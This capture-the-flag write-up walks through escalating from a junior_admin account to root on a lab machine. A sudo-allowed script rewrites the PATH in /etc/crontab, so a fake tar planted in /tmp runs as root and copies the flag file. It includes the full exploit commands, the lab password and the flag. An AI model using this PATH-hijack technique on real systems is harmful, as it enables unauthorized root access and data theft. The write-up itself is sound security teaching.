# Challenge Overview
**Objective**: Abuse set privileges from `junior_admin` to `root` to read the flag in root's directory.

**Misconfiguration Abused**: Unrefined sudo privileges to a `PATH` environment variable script, and a relative path call to `tar` in a root cron job.

## Step 1: Initial Access & Reconnaissance
- Connect to the server using the provided credentials:

```bash
ssh -p <port_number> junior_admin@<ctf_host>

# Password: dont_get_paid_enough
```

- Once logged in, perform basic enumeration. By looking at file permissions, we see we can read the `root` user directory. Performing an `ls -l` on this directory reveals our flag target location

```bash
ls -l /root

# Output: -r------- 1 root root <file_size> <Month> <Day> <Time> flag.txt
```

- The directory is readable, but the flag file is restricted to root reading only. We need to escalate our junior admin privileges to read this flag

## Step 2: Privilege Enumeration
- Check what commands `junior_admin` is allowed to run as root

```bash
sudo -l

# Output: (root) NOPASSWD: /opt/fix_cron_paths.sh
```

- We can run the `fix_cron_paths.sh` script as root without needing a password. Let's see what this script does.

```bash
cat /opt/fix_cron_paths.sh

# =======================================================
# Output:
!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: sudo /opt/fix_cron_paths.sh <new_path>"  
    exit 1
fi

# Band-aid fix to update paths when the cleanup script breaks
sed -i "s#^PATH=.*#PATH=$1#" /etc/crontab
echo "Cron paths updated! Hopefully it works this time..."
# =======================================================
```

- This script takes one argument and uses `sed` to overwrite the `PATH` variable inside the global machine crontab! (`/etc/crontab`)
- Let's look at the system crontab to see what is actually running:

```bash
cat /etc/crontab

# =======================================================
# Output:

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/local/bin/cleanup_logs.sh

# =======================================================
```

- There's a script (`cleanup_logs.sh`) running every minute as `root`. Let's see what it's doing:

```bash
cat /usr/local/bin/cleanup_logs.sh

# =======================================================
# Output:

#!/bin/bash
# Quick hack to archive old logs before the disk fills up again
tar -cf /dev/null /var/log/syslog 2>/dev/null

# =======================================================
```
- The script is used for cleaning up old logs. However, it's using a relative path to call the `tar` command!

## Step 3: Vulnerability Analysis
- The `cleanup_logs.sh` script is vulnerable to PATH Hijacking
1. It executes the `tar` command without specifying its absolute path (Should be `/bin/tar`)
2. The operating system relies on the `PATH` variable defined in `/etc/crontab` to find the `tar` executable
3. We have a `sudo` script that allows us to completely rewrite that `PATH` variable defined in the global crontab
- If we prepend a directory we control (like `/tmp`) to the `PATH` variable, and place a malicious script named `tar` in that directory - then the cron job will execute *our script* instead of the actual `tar` utility. Since this is a `root` cronjob, we found a way to read our flag!

## Step 4: Exploitation
1. Create the Payload
- Move to the `/tmp` directory (anyone can write to this directory) and create the malicious `tar` script:

```bash
cd /tmp
vim tar
```


- Configure a script to copy the flag from `root`'s directory into our controlled `/tmp` directory

```bash
cp /root/flag.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt # Make the flag readable for our account
```

2. Make the Payload Executable
- Cron will not run your script if it is not executable. You also will not see any error message, if misconfigured, due to the context that Cron is running in

```bash
chmod +x /tmp/tar
```

3. Inject the PATH
- Run the vulnerable script to prepend `/tmp` to the cron daemon's search path. 
- We must include the standard system path as well, otherwise our fake `tar` script's `cp` and `chmod` commands will fail\*

```bash
sudo /opt/fix_cron_paths.sh "/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"
```
\**You could also modify the `tar` script to use absolute paths for `cp` and `chmod` (`/bin/cp` & `/bin/chmod`) if you wanted to make blowing away the whole PATH variable for just `/tmp` work*

4. Capture the Flag
- The cron job runs every 60 seconds. Wait up to one minute, then check the `/tmp` directory to find the copied flag!

```bash
ls /tmp

# Output:
flag.txt
```

```bash
cat /tmp/flag.txt

# Output:
sgctf{cr0n_p4th_m4st3r_h3x0r}